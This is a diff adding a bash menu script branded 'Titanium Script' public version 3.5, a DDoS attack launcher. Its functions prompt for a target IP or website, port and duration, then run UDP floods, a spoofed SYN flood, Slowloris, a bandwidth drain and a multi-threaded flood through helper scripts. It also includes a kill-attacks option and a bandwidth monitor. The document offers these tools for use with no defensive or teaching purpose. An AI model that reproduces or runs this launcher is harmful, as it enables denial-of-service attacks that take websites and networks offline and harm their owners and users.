@@ -1,0 +1,317 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[1;37m'
+NC='\e[0m'              # No Color
+# Trap Signal Script
+#
+#TitaniumScript.bypass//BASH  Bypass.Function $invisible.inv
+#
+exit_script()
+{
+  echo "* * *Trap * * *"
+  ./menu
+}
+
+dstat1()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          ADMIN DSTAT                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+dstat
+    
+}
+
+udp_flooda()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                              UDP DRAXz                            ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Enter target ip please :"
+read ip
+echo "Enter a Port Number :"
+read port
+echo "Enter a the time :"
+read time
+./gott.1.pl $ip $port 0 $time
+}
+
+udp_floodb()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                                  UDP                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Enter target ip please :"
+read ip
+echo "Enter a Port Number :"
+read port
+echo "Enter the time :"
+read time
+python gott.2.py $ip $port $time
+}
+
+slap()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 3.5                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                            GoTT DRAXz                             ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Enter target ip please :"
+read ip
+perl gott.3.pl $ip
+}
+
+slowloris()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                        Slowloris DRAXz                             ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "To stop this script after execution hold [CTRL] + [C]"
+echo "Enter website address :"
+read host
+echo "Enter a port :"
+read port
+./slowloris $host $port
+}
+
+killall()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+pkill gott.1.pl
+pkill gott.2.py
+pkill gott.2.pl
+pkill gott.4.pl
+pkill slowloris
+}
+
+fry()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                         ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 3.5                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦             SUPER Nytro BY TITANIUM STOP WITH CTRL+C              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Private command you cannot use it ! Press Enter"
+read enter
+
+}
+
+bw()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                    Bandwidth Drain DRAXz                     ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Enter target ip please :"
+read ip
+echo "Enter a Port Number :"
+read port
+echo "Enter a the time :"
+read time
+./gott -i $ip -p $port -s 32000 -t $time
+}
+
+multi()
+{
+    clear
+    echo -e " $CYAN} "
+    echo "               TITANIUM MULTI FLOOD UPDATED "   
+    echo "Script created by gott and get updated by Titanium"
+    echo ""	
+    echo -e "        '||    ||'          '||    .    || " 
+    echo -e "         |||  |||  ... ...   ||  .||.  ...  "
+    echo -e "         |'|..'||   ||  ||   ||   ||    ||  "
+    echo -e "         | '|' ||   ||  ||   ||   ||    ||  "
+    echo -e "        .|. | .||.  '|..'|. .||.  '|.' .||. "
+    echo ""
+    echo "    He who dare to play god must pay a steep price."
+    echo ""
+echo "Enter IP Address :"
+read ip
+echo "Enter Port :"
+read port
+echo "Enter size Ex: 65500"
+read size
+echo "Enter the time in seconds :"
+read time
+echo "Enter the thread count :"
+read threads
+echo "Would you like to see the output WARNING if yes flood may slow down! 0=No 1=Yes"
+read output
+perl cgi-bin.pl $ip $port $size $time $threads $output
+}
+
+syn()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                         PUBLIC VERSION 3.5 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              TITANIUM${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ TITANIUM${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                    Spoofed SyN Flood coded in C                   ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Enter target ip please :"
+read ip
+echo "Enter a Port Number :"
+read port
+./syn $ip $port
+}
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear
+echo -e "${WHITE}Created By Titanium${RED}                           User:"${LIGHTBLUE}PUBLIC "${RED}Expires:"${LIGHTBLUE}FREE
+echo -e "${WHITE}                                               PUBLIC MENU 3.5 ENJOY
+                                        "${WHITE}Your Version: "${GREEN}v3.5 "${RED}[public version]
+echo -e "${WHITE}
+   #   P   r   o   j   e   c   t           ProjectTitanium Public Release ${WHITE}
+  / \ / \ / \ / \ / \ / \ / \ / \         --------------------------------${CYAN}
+ ( T | i | t | a | n | i | u | m )${LIGHTBLUE}        ¦VPS: RAM 4GO BANDWICH: 1GBPS  ¦${WHITE}
+  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------
+"${WHITE}
+    echo -e "${WHITE}Note: "${GREEN}TO EXIT A SCRIPT OR STOP ATTACKS PRESS [CTRL+C]
+    echo""
+	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                            [11] ADMIN DSTAT "                                                                                         																									
+    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${RED}                          "
+    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${RED}                         "
+    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${RED}                            "
+    echo -e "${LIGHTBLUE}[5]${RED}TITANIUM SCRIPT${BLUE}" 
+    echo -e "${LIGHTBLUE}[6]${GREEN}Bandwidth${BLUE}"
+    echo -e "${LIGHTBLUE}[7]${GREEN}SyN Flood${BLUE}"
+    echo -e "${LIGHTBLUE}[8]${GREEN}Kill Attacks${BLUE}"
+    echo -e "${LIGHTBLUE}[9]${LIGHTBLUE}Change Password${CYAN}"
+	echo -e "${LIGHTBLUE}[10]${LIGHTBLUE}MULTI UPDATED${CYAN}"
+    echo -e "                                                              Bypass [${RED}OFF${CYAN}]"
+    echo -n "#ProjectTitanium - Enter your menu choice [1-11]: "
+    read yourch
+    case $yourch in
+      1) udp_flooda ;;
+      2) udp_floodb ;;
+      3) slap ;;
+	  4) slowloris ;;
+	  5) fry ;;
+         6) bw ;;
+         7) syn ;;
+	  8) killall ;;
+	  9) passwd ;;
+	  10) multi ;;
+	  11) dstat1 ;;
+      ex) echo "As you Command" ;  exit 1  ;;
+	  end) pkill menu  ;;
+      *) echo "Invalid Selection, Please make another selection between [1-11]" ;
+         echo "Press Enter. . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_input1
+#
+Take_input1
